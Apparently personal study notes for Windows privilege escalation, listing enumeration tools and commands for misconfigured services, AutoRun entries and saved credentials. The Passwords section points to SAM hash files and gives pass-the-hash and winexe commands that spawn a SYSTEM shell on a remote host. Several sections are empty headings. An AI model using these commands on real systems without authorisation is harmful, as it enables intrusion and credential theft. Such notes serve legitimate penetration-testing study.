# Tools - Privilege escalation

1. Winpeas
2. sharup
3. powerup

Userpermissions check - accesschk.exe, But old version only supports --accepteula command line option

#### Techniques
##### 1. Kernel exploits

Tools
Windows exploit suggester
Waston - For recent version of Windows

Precompiled kernel exploits
SecWiki

##### 2. Service Misconfigurations

##### a. Insecure Service Properties

Weakness exploitable => Modifying the service configuration file by changing the binpath referring malicious.exe file. Upon executing, the reverse shell can be obtained.

Command  

```
.\winpeas quiet servicesinfo
```

Use accesschk.exe to check the permission to change the config of service, start/stop the service
```
.\accesschk.exe /accepteula -uwcqv user <service name>
```

```
sc qc <Servicename>
```
Check the START_TYPE
DEMAND_START means that the service can be start manually <br />
Binary path name and any dependencies can be identified. <br />
Service_Start_Name => LocalSystem => Means service is running with system privilege  <br />

```
sc query <servicename>
```
STATE => Current state of the service, started or stopped.

##### b. Unquoted Service Path
##### c. Weak Registry Permissions
##### d. Insecure Service Executables
##### e. DLL Hijacking

##### 3. Registry exploits

##### a. AutoRuns

If we are able to write to an AutoRun executable and able to restart the system,then t is possible to escalate privileges
```
.\winPEASany.exe quiet applicationsinfo
```

Command to enumerate the AutoRun executables manually

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Then use accesschk.exe to verify the permissions of each service.

```
.\accesschk.exe /accepteula -wvu "C:\ProgramFiles\<Sample Program>\<program.exe>"
```

##### b. AlwaysInstallElevated

##### 4. Passwords

##### a. Searching Registry password

To check common password locations

```
.\winPEASany.exe quiet filesinfo userinfo
```

Using winexe command, we can spawn a shell

```
# winexe -U '<username>%<password>' //192.168.X.X cmd.exe
```

##### b. Saved Creds

Use winPEAS to check for saved credentials:

```
.\winPEASany.exe quiet cmd windowscreds
```

To doublecheck the output manually using following command

```
cmdkey /list
```

##### c. Searching for configruation files

Unattented.xml file

```
.\winPEASany.exe quiet cmd searchfast filesinfo
```

##### d. SAM & Passing the Hash

SAM and SYSTEM file default location
```
C:\Windows\System32\config
```

Backups of the files may exist in the following directories
```
C:\Windows\Repair
C:\Windows\System32\config\RegBack
```

Once hashes are obtained, in either ways we can spwan a cmd.exe
1. Crack the hashes and use winexe to spawn a shell
2. Use pth-winexe --system -U '<Username>%aad3b435b51404eeaad3b435b51404ee:<Users Hash>' //192.168.X.X cmd.exe
  --system - To spwan system (admin) shell
  Without --system, it could be normal user shell.
  
  
